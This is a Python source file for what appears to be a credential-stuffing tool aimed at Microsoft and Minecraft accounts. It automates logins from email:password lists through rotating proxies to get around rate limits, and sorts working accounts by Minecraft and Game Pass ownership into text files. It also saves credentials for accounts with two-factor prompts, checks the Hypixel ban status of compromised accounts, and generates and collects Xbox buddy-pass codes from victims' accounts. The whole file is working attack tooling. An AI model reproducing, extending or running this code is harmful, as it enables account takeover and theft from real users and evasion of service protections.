import re
import time
import uuid
import json
import threading
import socket
import socks
import random
import requests
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timezone

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.networking.packets.clientbound import play as clientbound_play, login as clientbound_login
    from minecraft.exceptions import LoginDisconnect, YggdrasilError
    import minecraft.authentication
    minecraft.authentication.HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Connection': 'close'
    }
    MINECRAFT_AVAILABLE = True
    import sys as _sys
    _original_excepthook = threading.excepthook if hasattr(threading, 'excepthook') else None
    def _silent_excepthook(args):
        if args.exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            return
        if 'minecraft.networking' in str(args.exc_traceback) or 'minecraft.exceptions' in str(args.exc_traceback):
            return
        if _original_excepthook:
            _original_excepthook(args)
    if hasattr(threading, 'excepthook'):
        threading.excepthook = _silent_excepthook
    _original_sys_excepthook = _sys.excepthook
    def _silent_sys_excepthook(exc_type, exc_value, exc_traceback):
        if exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            if exc_traceback and ('minecraft' in str(exc_traceback.tb_frame) or 'minecraft' in str(exc_value)):
                return
        _original_sys_excepthook(exc_type, exc_value, exc_traceback)
    _sys.excepthook = _silent_sys_excepthook
except ImportError:
    MINECRAFT_AVAILABLE = False


def checkownership(entitlements_response):
    items = entitlements_response.get('items', [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    for item in items:
        name = item.get('name', '')
        source = item.get('source', '')
        if name in ('game_minecraft', 'product_minecraft') and source in ('PURCHASE', 'MC_PURCHASE'):
            has_normal_minecraft = True
        if name == 'product_game_pass_pc':
            has_game_pass_pc = True
        if name == 'product_game_pass_ultimate':
            has_game_pass_ultimate = True
    if has_normal_minecraft and has_game_pass_pc:
        return 'Normal Minecraft (with Game Pass)'
    if has_normal_minecraft and has_game_pass_ultimate:
        return 'Normal Minecraft (with Game Pass Ultimate)'
    elif has_normal_minecraft:
        return 'Normal Minecraft'
    elif has_game_pass_ultimate:
        return 'Xbox Game Pass Ultimate'
    elif has_game_pass_pc:
        return 'Xbox Game Pass (PC)'
    return None


def checkmc(session, email, password, token, xbox_token, config, proxylist, maxretries, getproxy,
            retries_ref, bedrock_ref, cpm_ref, checked_ref, xgp_ref, xgpu_ref, other_ref,
            stats_lock, fname, write_dedupe, Capture, capture_mc, claim_buddypass_offers,
            UI_ENABLED=False, ui=None):
    acctype = None
    attempts = 0
    max_time = time.time() + 45
    checkrq = None
    while attempts < maxretries and time.time() < max_time:
        attempts += 1
        try:
            checkrq = session.get(
                'https://api.minecraftservices.com/entitlements/license',
                headers={'Authorization': f'Bearer {token}'},
                verify=False,
                timeout=10
            )
            if checkrq.status_code == 429:
                retries_ref[0] += 1
                session.proxies = getproxy()
                time.sleep(0.1 if len(proxylist) > 0 else 1)
                continue
            else:
                break
        except Exception as e:
            retries_ref[0] += 1
            session.proxies = getproxy()
            time.sleep(0.1)
            continue

    if time.time() >= max_time or checkrq is None:
        return False

    if checkrq.status_code == 200:
        acctype = checkownership(checkrq.json())
        if acctype is None:
            return False

        name, uuid_str, capes_list = 'N/A', 'N/A', []
        try:
            profilerq = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {token}'},
                timeout=10
            )
            if profilerq.status_code == 200:
                p_data = profilerq.json()
                name = p_data.get('name', 'N/A')
                uuid_str = p_data.get('id', 'N/A')
                capes_data = p_data.get('capes', [])
                for c in capes_data:
                    if c.get('alias'):
                        capes_list.append(c['alias'])
        except:
            pass

        capes_str = ', '.join(capes_list)
        try:
            capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
            if 'Game Pass' not in acctype:
                capture.handle(session)
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f"Capture error: {e}")

        if acctype in ('Xbox Game Pass Ultimate', 'Normal Minecraft (with Game Pass Ultimate)'):
            with stats_lock:
                xgpu_ref[0] += 1
            write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
            claim_buddypass_offers(session, xbox_token, fname)
            capture_mc(token, session, email, password, acctype)
            return True
        elif acctype in ('Xbox Game Pass (PC)', 'Normal Minecraft (with Game Pass)'):
            with stats_lock:
                xgp_ref[0] += 1
            write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
            if 'Normal' in acctype:
                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
            claim_buddypass_offers(session, xbox_token, fname)
            return True
        elif acctype == 'Normal Minecraft':
            write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
            return True

    return False


def get_urlPost_sFTTag(session, sFTTag_url, RE_SFTTAG_VALUE, RE_URLPOST_VALUE, config, maxretries, getproxy, retries_ref):
    attempts = 0
    while attempts < maxretries:
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            timeout_val = int(config.get('timeout', 10))
            text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
            match = RE_SFTTAG_VALUE.search(text)
            if match:
                sFTTag = next((g for g in match.groups() if g is not None), None)
                if sFTTag:
                    match_url = RE_URLPOST_VALUE.search(text)
                    if match_url:
                        urlPost = next((g for g in match_url.groups() if g is not None), None)
                        if urlPost:
                            urlPost = urlPost.replace('&amp;', '&')
                            return (urlPost, sFTTag, session)
        except:
            pass
        session.proxies = getproxy()
        retries_ref[0] += 1
        attempts += 1
        time.sleep(0.1)
    return (None, None, session)


def get_xbox_rps(session, email, password, urlPost, sFTTag, sFTTag_url,
                 RE_IPT, RE_PPRID, RE_UAID, RE_ACTION_FMHF, RE_RETURN_URL,
                 config, maxretries, getproxy, retries_ref, fname):
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close'
            }
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=int(config.get('timeout', 10)))
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif 'cancel?mkt=' in login_request.text:
                ipt = RE_IPT.search(login_request.text).group()
                pprid = RE_PPRID.search(login_request.text).group()
                uaid = RE_UAID.search(login_request.text).group()
                data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
                action_url = RE_ACTION_FMHF.search(login_request.text).group()
                ret = session.post(action_url, data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
                return_url = RE_RETURN_URL.search(ret.text).group()
                fin = session.get(return_url, allow_redirects=True, timeout=int(config.get('timeout', 10)))
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif any(value in login_request.text for value in [
                'recover?mkt', 'account.live.com/identity/confirm?mkt',
                'Email/Confirm?mkt', '/Abuse?mkt='
            ]):
                with open(f'results/{fname}/2fa.txt', 'a') as file:
                    file.write(f'{email}:{password}\n')
                return ('2FA', session)
            elif any(value in login_request.text.lower() for value in [
                'password is incorrect', "account doesn't exist",
                "that microsoft account doesn't exist", 'sign in to your microsoft account',
                "tried to sign in too many times with an incorrect account or password",
                'help us protect your account'
            ]):
                return ('None', session)
            else:
                session.proxies = getproxy()
                retries_ref[0] += 1
                tries += 1
                time.sleep(0.1)
        except Exception:
            session.proxies = getproxy()
            retries_ref[0] += 1
            tries += 1
            time.sleep(0.1)
    return ('None', session)


def check_hypixel_ban(capture_obj, token, name, uuid_val, session, banproxies, proxy_lock,
                      maxretries, config, fname, write_dedupe, file_lock, UI_ENABLED=False, ui=None):
    if not MINECRAFT_AVAILABLE:
        capture_obj.banned = '[Error] pyCraft Missing'
        return
    if not config.get('hypixelban'):
        return
    if capture_obj.ban_checked:
        return
    capture_obj.ban_checked = True
    try:
        auth_token = AuthenticationToken(username=name, access_token=token, client_token=uuid.uuid4().hex)
        auth_token.profile = Profile(id_=uuid_val, name=name)
        tries = 0
        while tries < maxretries:
            connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
            original_handle_exception = connection._handle_exception

            def safe_handle_exception(e, exc_info):
                try:
                    error_str = str(e)
                    if 'RateLimiter disallowed' in error_str or '429' in error_str:
                        try:
                            capture_obj.banned = '[Error] Rate Limit'
                        except:
                            pass
                        return
                    if 'SSLError' in error_str or 'EOF occurred' in error_str:
                        try:
                            capture_obj.banned = '[Error] Connection/SSL'
                        except:
                            pass
                        return
                    if isinstance(e, (ConnectionAbortedError, ConnectionResetError)):
                        return
                    if isinstance(e, OSError) and hasattr(e, 'winerror') and e.winerror == 10053:
                        return
                    if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                        return
                    if isinstance(e, ValueError) and "closed file" in error_str:
                        return
                    if isinstance(e, requests.exceptions.RequestException):
                        try:
                            capture_obj.banned = '[Error] Connection'
                        except:
                            pass
                        return
                    if 'multiplayer.access.banned' in error_str or (MINECRAFT_AVAILABLE and isinstance(e, YggdrasilError)):
                        try:
                            capture_obj.banned = f"[Ban] {error_str}"
                        except:
                            pass
                        return
                except:
                    pass
                original_handle_exception(e, exc_info)

            connection._handle_exception = safe_handle_exception

            @connection.listener(clientbound_login.DisconnectPacket, early=True)
            def login_disconnect(packet):
                try:
                    data = json.loads(str(packet.json_data))
                    data_str = str(data)
                    if 'temporarily banned' in data_str:
                        try:
                            duration = data['extra'][4]['text'].strip()
                            ban_id = data['extra'][8]['text'].strip()
                            capture_obj.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                        except:
                            capture_obj.banned = "Temporarily Banned"
                        write_dedupe(fname, 'Banned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('banned')
                    elif 'Suspicious activity' in data_str:
                        try:
                            ban_id = data['extra'][6]['text'].strip()
                            capture_obj.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                        except:
                            capture_obj.banned = "[Permanently] Suspicious activity"
                        write_dedupe(fname, 'Banned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('banned')
                    elif 'You are permanently banned from this server!' in data_str:
                        try:
                            reason = data['extra'][2]['text'].strip()
                            ban_id = data['extra'][6]['text'].strip()
                            capture_obj.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                        except:
                            capture_obj.banned = "[Permanently] Banned"
                        write_dedupe(fname, 'Banned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('banned')
                    elif 'The Hypixel Alpha server is currently closed!' in data_str:
                        capture_obj.banned = 'False'
                        write_dedupe(fname, 'Unbanned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('unbanned')
                    elif 'Failed cloning your SkyBlock data' in data_str:
                        capture_obj.banned = 'False'
                        write_dedupe(fname, 'Unbanned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('unbanned')
                    else:
                        extra_list = data.get('extra', [])
                        full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                        if not full_msg:
                            full_msg = data.get('text', '')
                        capture_obj.banned = full_msg if full_msg else str(data)
                        write_dedupe(fname, 'Banned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('banned')
                except Exception as e:
                    capture_obj.banned = f"Error parsing ban: {str(e)}"

            @connection.listener(clientbound_play.DisconnectPacket, early=True)
            def play_disconnect(packet):
                login_disconnect(packet)

            def _mark_unbanned(packet_name):
                if capture_obj.banned is None:
                    capture_obj.banned = 'False'
                    write_dedupe(fname, 'Unbanned.txt', f'{capture_obj.email}:{capture_obj.password}\n')
                    if UI_ENABLED and ui:
                        ui.increment_stat('unbanned')
                        ui.log_info(f'Unbanned detected ({packet_name}): {name}')
                    def delayed_disconnect():
                        time.sleep(1.0)
                        connection.disconnect()
                    threading.Thread(target=delayed_disconnect).start()

            @connection.listener(clientbound_play.JoinGamePacket, early=True)
            def joined_server(packet):
                _mark_unbanned('JoinGame')

            @connection.listener(clientbound_play.KeepAlivePacket, early=True)
            def keep_alive(packet):
                _mark_unbanned('KeepAlive')

            @connection.listener(clientbound_play.PlayerPositionAndLookPacket, early=True)
            def position_look(packet):
                _mark_unbanned('PosLook')

            @connection.listener(clientbound_play.TimeUpdatePacket, early=True)
            def time_update(packet):
                _mark_unbanned('TimeUpdate')

            @connection.listener(clientbound_play.RespawnPacket, early=True)
            def respawn(packet):
                _mark_unbanned('Respawn')

            try:
                connected = False
                if len(banproxies) > 0:
                    with proxy_lock:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            auth_part = atsplit[0]
                            ip_port = atsplit[1].split(':')
                            user, pwd = auth_part.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]), username=user, password=pwd)
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                        connection.connect()
                else:
                    connection.connect()

                connected = True
                c = 0
                while capture_obj.banned is None and c < 3000:
                    time.sleep(0.01)
                    c += 1
                connection.disconnect()
            except:
                pass

            if capture_obj.banned is None:
                capture_obj.banned = '[Error] Connection Timeout/No Packet'

            if capture_obj.banned and str(capture_obj.banned).startswith('[Error]'):
                if tries < maxretries - 1:
                    capture_obj.banned = None
                    time.sleep(1)
                    tries += 1
                    continue

            if capture_obj.banned is not None:
                break
            tries += 1
    except Exception:
        pass


def claim_buddypass_offers(session, xbox_token, fname, config, maxretries, proxylist, getproxy, retries_ref, write_dedupe):
    codes = []
    try:
        xsts = None
        for _ in range(maxretries):
            try:
                xsts = session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json={
                        'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]},
                        'RelyingParty': 'http://mp.microsoft.com/',
                        'TokenType': 'JWT'
                    },
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=int(config.get('timeout', 10))
                )
                break
            except Exception:
                retries_ref[0] += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    time.sleep(20)
                continue
        else:
            return

        js = xsts.json()
        if 'DisplayClaims' not in js or 'xui' not in js['DisplayClaims']:
            return
        uhss = js['DisplayClaims']['xui'][0]['uhs']
        xsts_token = js.get('Token')
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Authorization': f'XBL3.0 x={uhss};{xsts_token}',
            'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19',
            'Origin': 'https://www.xbox.com',
            'Priority': 'u=1, i',
            'Referer': 'https://www.xbox.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
            'X-Ms-Api-Version': '1.0'
        }

        r = None
        for _ in range(maxretries):
            try:
                r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries_ref[0] += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    time.sleep(20)
                continue
        else:
            return

        def process_offers(offers):
            current_time = datetime.now(timezone.utc)
            valid_offer_ids = [
                offer['offerId'] for offer in offers
                if not offer['claimed'] and offer['offerId'] not in codes
                and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)
            ]
            for offer in valid_offer_ids:
                write_dedupe(fname, 'Codes.txt', f'{offer}\n')
            should_continue = any(offer['offerId'] not in codes for offer in offers)
            for offer in offers:
                codes.append(offer['offerId'])
            return should_continue

        if 'offerid' in r.text.lower():
            offers = r.json()['offers']
            for offer in offers:
                codes.append(offer['offerId'])
            if len(offers) < 5:
                for _ in range(3):
                    try:
                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                        if 'offerId' in r.text:
                            if not process_offers(r.json()['offers']):
                                break
                        else:
                            break
                    except Exception:
                        retries_ref[0] += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0:
                            time.sleep(20)
                        continue
        else:
            for _ in range(3):
                try:
                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                    if 'offerId' in r.text:
                        if not process_offers(r.json()['offers']):
                            break
                    else:
                        break
                except Exception:
                    retries_ref[0] += 1
                    session.proxies = getproxy()
                    if len(proxylist) == 0:
                        time.sleep(20)
                    continue
    except Exception:
        pass
